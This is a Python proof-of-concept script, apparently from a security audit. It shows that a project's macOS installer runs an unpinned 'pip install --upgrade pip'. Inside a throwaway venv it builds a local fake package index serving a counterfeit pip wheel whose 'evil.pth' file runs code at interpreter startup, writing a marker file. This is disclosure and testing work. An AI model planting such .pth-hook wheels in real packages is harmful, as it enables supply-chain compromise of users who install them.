#!/usr/bin/env python3
"""LIVE PoC 5 — run the real macOS installer's unpinned pip upgrade in a sandbox.

Use: python3 poc5_live_unpinned_pip.py --confirm [--installer PATH]

Reads the *real* install-macos.sh from the checkout (or --installer), extracts the
exact ``pip install --upgrade pip`` command, and actually runs it inside a throwaway
venv with a local fake package index. The fake ``pip`` wheel contains a .pth hook that
writes a marker file when the venv's Python next starts — proving arbitrary code from
the "upstream" is accepted before any of the project's hashes are checked. Only the
throwaway venv is touched; your system pip is never upgraded.
"""
import argparse
import os
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

from live_common import confirm_arg, load_orbi, orbi_arg, require_confirm


def build_fake_index(root: Path, marker: Path):
    """A local PEP 503 index serving a fake ``pip`` wheel with a .pth hook."""
    idx = root / "simple" / "pip"
    idx.mkdir(parents=True)
    whl = idx / "pip-999.0-py3-none-any.whl"
    (idx / "index.html").write_text(f'<a href="{whl.name}">{whl.name}</a>')
    record = (
        "pip/__init__.py,,\n"
        "pip-999.0.dist-info/METADATA,,\n"
        "pip-999.0.dist-info/WHEEL,,\n"
        "pip-999.0.dist-info/RECORD,,\n"
        "evil.pth,,\n"
    )
    with zipfile.ZipFile(whl, "w") as z:
        z.writestr("pip/__init__.py", "")
        z.writestr("pip-999.0.dist-info/METADATA",
                   "Metadata-Version: 2.1\nName: pip\nVersion: 999.0\n")
        z.writestr("pip-999.0.dist-info/WHEEL",
                   "Wheel-Version: 1.0\nGenerator: poc5\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
        z.writestr("pip-999.0.dist-info/RECORD", record)
        z.writestr("evil.pth",
                   "import pathlib; pathlib.Path(%r).write_text('arbitrary code ran\\n')\n" % str(marker))
    return root / "simple"


def main():
    ap = argparse.ArgumentParser()
    orbi_arg(ap)
    ap.add_argument("--installer", help="path to install-macos.sh (default: in the checkout)")
    ap.add_argument("--marker-name", default="PWNED")
    confirm_arg(ap, "run the installer's unpinned pip command against a local fake index")
    args = ap.parse_args()
    require_confirm(args)
    root = load_orbi(args)
    installer = Path(args.installer) if args.installer else root / "install-macos.sh"
    if not installer.is_file():
        raise SystemExit(f"[!] installer not found: {installer}")

    lines = installer.read_text().splitlines()
    pos = next(i for i, line in enumerate(lines) if "pip install" in line and "--upgrade pip" in line)
    print(f"[*] real installer claim : {lines[pos - 1].strip()}")
    print(f"[*] real upgrade command : {lines[pos].strip()}")

    with tempfile.TemporaryDirectory(prefix="orbi-poc5-live-") as td:
        td = Path(td)
        marker = td / args.marker_name
        index = build_fake_index(td, marker)
        venv = td / "venv"
        subprocess.run([sys.executable, "-m", "venv", str(venv)], check=True,
                       stdout=subprocess.DEVNULL)
        env = {**os.environ, "PIP_INDEX_URL": index.as_uri()}
        proc = subprocess.run(
            [str(venv / "bin" / "python"), "-m", "pip", "install", "--quiet", "--upgrade", "pip"],
            env=env, capture_output=True, text=True,
        )
        print(f"[*] pip exit code: {proc.returncode}")
        if proc.returncode != 0:
            print(f"[-] pip failed: {proc.stderr.strip()[-400:]}")
            return 1
        # The .pth hook runs on the next start of the venv's interpreter.
        subprocess.run([str(venv / "bin" / "python"), "-c", "pass"], check=True)
        if marker.exists():
            print(f"[+] {marker.name}: {marker.read_text().strip()}")
            print("[+] CONFIRMED: the unpinned upgrade installed attacker code from the fake index")
            return 0
        print("[-] fake wheel installed but .pth hook did not write the marker")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
